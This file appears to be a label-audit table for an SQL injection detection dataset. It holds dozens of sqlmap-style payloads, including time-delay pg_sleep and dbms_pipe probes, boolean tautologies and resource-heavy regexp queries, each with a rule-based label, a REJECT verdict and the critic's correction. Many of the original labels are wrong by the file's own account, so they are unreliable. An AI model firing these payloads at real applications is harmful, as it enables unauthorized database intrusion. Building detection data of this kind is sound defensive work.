row_index,payload_norm,sqli_type,db_engine,confidence,reasoning,label_source,verdict,critic_evidence,correction_json
4334,"-1917"" ) or 8571 = 8571--",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
4338,select pg_sleep ( 5 ) and ( '%' = ',time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (3); parentheses mismatch (2 open, 1 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4370,select pg_sleep ( 5 ) and ( ( ( 'qslr' = 'qslr,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (3); parentheses mismatch (4 open, 1 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4392,1' ) ) ) order by 1--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
4396,-2781 ) ) ) or 2573 = 5848--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
4399,select pg_sleep ( 5 ) ) ||',time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (1 open, 2 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4409,"1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
4410,1 ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( 7015 = 7015,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4418,"1%' ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (8 open, 10 close). Plus attack signal detected -> benign label wrong",
4420,"1%' ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (11 open, 14 close). Plus attack signal detected -> benign label wrong",
4434,1'|| ( select 'jmhb' where 1794 = 1794 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (3); parentheses mismatch (3 open, 2 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4447,"1 ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (5 open, 7 close). Plus attack signal detected -> benign label wrong",
4472,1' and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'pziy' = 'pziy,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=generic","{""db_engine"": ""firebird""}"
4480,"select pg_sleep ( 5 ) and ""zhsc"" = ""zhsc",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (3). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4499,1' in boolean mode ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (2 open, 3 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4561,1 ) ) as uvep where 6016 = 6016 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (2 open, 4 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4564,"1"" ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ""cowu"" like ""cowu",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4583,"1%"" ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (5 open, 7 close). Plus attack signal detected -> benign label wrong",
4613,1' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 'nqol' = 'nqol,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4620,1 where 7452 = 7452 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4624,"1%' ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (11 open, 13 close). Plus attack signal detected -> benign label wrong",
4638,"1 ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (11 open, 13 close). Plus attack signal detected -> benign label wrong",
4644,1' where 7828 = 7828 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4650,1%' ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (2 open, 4 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4676,"1' ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (8 open, 11 close). Plus attack signal detected -> benign label wrong",
4681,1 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) # awpq,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4682,select pg_sleep ( 5 ) and ( 1044 = 1044,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (2 open, 1 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4705,"1 ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
4728,-2790' ) ) or 8571 = 8571--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
4752,"1' ) as xagu where 9088 = 9088 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (16 open, 17 close). Plus attack signal detected -> benign label wrong",
4782,1' ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( 'mzqi' = 'mzqi,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4800,1'|| ( select 'zxla' from dual where 7634 = 7634 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ) ||',boolean_blind,oracle,0.95,7634 = 7634 and detected — boolean_blind injection (priority 8) on oracle,rule-based,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=oracle","{""db_engine"": ""firebird""}"
4819,-2717' ) ) ) or 8571 = 8571--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
4824,"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
4851,1' ) where 4364 = 4364 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (2 open, 3 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4854,"select pg_sleep ( 5 ) and ( ( ( ""%"" = """,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (3); parentheses mismatch (4 open, 1 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4860,"1%"" ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (8 open, 9 close). Plus attack signal detected -> benign label wrong",
4881,1'+ ( select ejaj where 1651 = 1651 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) +',time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4887,"-2964"" ) ) order by 1--",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
4888,"-9208%"" ) ) or 8571 = 8571--",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
4893,1' ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( 'odsl' like 'odsl,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4926,1'|| ( select 'ocmk' from dual where 3961 = 3961 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) ||',time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
4928,1 ) ) ) and 9575 = 1640--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
4976,1 where 6523 = 6523 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
